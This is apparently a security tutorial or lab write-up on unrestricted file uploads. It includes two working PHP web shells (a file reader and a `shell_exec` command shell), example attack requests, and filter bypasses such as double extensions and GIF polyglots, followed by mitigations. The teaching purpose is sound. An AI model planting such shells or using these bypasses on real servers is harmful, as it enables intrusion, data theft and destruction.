### From a security standpoint
- the worst-case is when an application lets you upload server-side scripts (PHP, Java, Python, etc.) **and** actually runs them. That instantly gives you the power to deploy your own web shell.

<p align="center">
  <img src="https://github.com/user-attachments/assets/bf96970c-b4f3-454b-8f3d-5dcd584cde31" alt="image" />
</p>

---

### What’s a Web Shell?

A web shell is a small script you upload that turns HTTP requests into system commands on the server. Once it’s in place, you interact with it just like an API:

```http
GET /uploads/shell.php?command=whoami HTTP/1.1
Host: victim.example.com
```

The script grabs the `command` parameter, runs it via `system()` or `shell_exec()`, and returns the result in the HTTP response.

---

### Why It’s So Dangerous

1. **Full File Access**

   * Read sensitive files: `/etc/passwd`, database credentials, logs.
   * Modify configuration or plant backdoors for persistent access.

2. **Remote Code Execution (RCE)**

   * Run arbitrary commands (`ls`, `grep`, even `rm -rf /`).
   * Install malware or crypto-miners.

3. **Network Pivoting**

   * Use the compromised server to scan or attack internal resources.
   * Launch further exploits against other systems under the same network.

---

### Example 1: Read Any File

```php
<?php
// reader.php
header('Content-Type: text/plain');
echo file_get_contents('/home/carlos/secret');
?>
```

1. Upload as `reader.php` via the vulnerable endpoint.
2. Visit `https://victim.example.com/uploads/reader.php` to see the secret file.

---

### Example 2: Interactive Command Shell

```php
<?php
// shell.php
if (isset($_GET['command'])) {
  echo "<pre>" . shell_exec($_GET['command']) . "</pre>";
}
?>
```

1. Upload as `shell.php`.
2. Invoke commands directly:

   ```
   https://victim.example.com/uploads/shell.php?command=uname -a
   ```

---

### Common Protections & Bypasses

* **Extension Whitelisting**: Only allow `.jpg`, `.png`, etc.

  * *Bypass*: use `.php5`, `.phtml`, or double extensions like `shell.php.jpg`.
* **Content-Type Checking**: Validate MIME and magic bytes.

  * *Bypass*: polyglot files (`GIF89a;<?php ... ?>`).
* **Store Outside Web Root**: Save uploads in a non-executable directory.

  * Serve them through a proxy script that only delivers safe file types.
* **Filename Sanitization**: Rename to random IDs, strip dangerous characters.
* **Permission Hardening**: Ensure upload directories aren’t marked executable (`chmod 0644`).

---

### Quick Mitigation Checklist

* Enforce strict **whitelist** of allowed file types.
* Validate file **headers** (magic bytes) and **size** limits.
* Rename files and store them **outside** web-accessible folders.
* Implement **anti-virus** or static code scanning on upload.
* Use a **Content Security Policy** (CSP) to limit script execution.
